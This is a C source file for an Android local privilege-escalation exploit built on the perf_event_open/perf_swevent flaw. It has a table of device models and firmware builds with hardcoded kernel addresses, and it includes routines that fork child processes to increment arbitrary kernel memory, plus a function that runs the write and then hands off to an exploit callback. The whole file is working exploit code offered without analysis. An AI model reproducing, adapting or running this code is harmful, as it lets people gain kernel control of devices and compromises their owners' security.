#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/system_properties.h>
#include <signal.h>
#include <sys/wait.h>
#include "perf_swevent.h"

#define PERF_SWEVENT_MAX_FILE 980

#ifndef __NR_perf_event_open
#define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
#endif

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int perf_swevent_enabled_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-11D",            "V24R40A",     0xc104cf1c },
  { "IS17SH",           "01.00.04",    0xc0ecbebc },
  { "URBANO PROGRESSO", "010.0.3000",  0xc0db6244 },
  { "ISW13F",           "V69R51I",     0xc09de374 },
  { "Sony Tablet S",    "TISU0143",    0xc06d7714 },
  { "Sony Tablet P",    "TISU0144",    0xc06d9914 },
  { "SH-04E",           "01.00.02",    0xc0ed41ec },
  { "SOL21",            "9.1.D.0.395", 0xc0cedfb4 },
  { "HTL21",            "JRO03C",      0xc0d07a7c },
  { "N-05E",            "A1000311",    0xc0f408f4 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_perf_swevent_enabled_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].perf_swevent_enabled_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static bool
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  int fd;

  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "Error %s\n", strerror(errno));
  }

  return (fd > 0);
}

static pid_t *child_process;
static int current_process_number;

enum {
  READ_END,
  WRITE_END,
};

static pid_t
prepare_pipes(int *read_fd)
{
  pid_t pid;
  int stdout_pipe[2];

  if (pipe(stdout_pipe) < 0) {
    return -1;
  }

  pid = fork();
  if (pid == -1) {
    return -1;
  } else if (pid == 0) {
    close(stdout_pipe[READ_END]);

    dup2(stdout_pipe[WRITE_END], STDOUT_FILENO);

    if (stdout_pipe[WRITE_END] >= 3) {
      close(stdout_pipe[WRITE_END]);
    }
  } else {
    close(stdout_pipe[WRITE_END]);
    *read_fd = stdout_pipe[READ_END];
  }

  return pid;
}

static pid_t
increment_address_value_in_child_process(unsigned long int address, int count, int *child_fd)
{
  unsigned long int perf_swevent_enabled;
  int offset;
  int i = 0;
  pid_t pid;

  perf_swevent_enabled = get_perf_swevent_enabled_address();
  if (!perf_swevent_enabled) {
    return -1;
  }

  offset = (int)(address - perf_swevent_enabled) / 4;
  offset |= 0x80000000;

  pid = prepare_pipes(child_fd);
  if (pid == 0) {
    for (i = 0; i < count; i++) {
      syscall_perf_event_open(offset);
    }
    printf("Done\n");
  }
  return pid;
}

#define MIN(x,y) (((x)<(y))?(x):(y))
#define BUFFER_SIZE 5
int
perf_swevent_write_value_at_address(unsigned long int address, int value)
{
  int number_of_children;

  printf("writing address is %x\n", value);

  current_process_number = 0;
  number_of_children = value / PERF_SWEVENT_MAX_FILE + 1;
  child_process = (pid_t*)malloc(number_of_children * sizeof(pid_t));

  while (value > 0) {
    char buffer[BUFFER_SIZE];
    int child_fd;
    int min = MIN(value, PERF_SWEVENT_MAX_FILE);
    pid_t pid = increment_address_value_in_child_process(address, min, &child_fd);
    if (pid <= 0) {
      return (int)pid;
    }
    read(child_fd, buffer, sizeof(buffer));
    close(child_fd);
    child_process[current_process_number] = pid;
    current_process_number++;
    value -= PERF_SWEVENT_MAX_FILE;
  }

  return current_process_number;
}

void
perf_swevent_reap_child_process(int number)
{
  int i;

  for (i = 0; i < number; i++) {
    kill(child_process[i], SIGKILL);
  }

  sleep(1);

  for (i = 0; i < number; i++) {
    int status;
    waitpid(child_process[i], &status, WNOHANG);
  }

  free(child_process);
}

bool
perf_swevent_run_exploit(unsigned long int address, int value,
                         bool(*exploit_callback)(void* user_data), void *user_data)
{
  int number_of_children;
  bool success;

  number_of_children = perf_swevent_write_value_at_address(address, value);
  if (number_of_children < 0) {
    return false;
  }

  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  success = exploit_callback(user_data);

  perf_swevent_reap_child_process(number_of_children);

  return success;
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
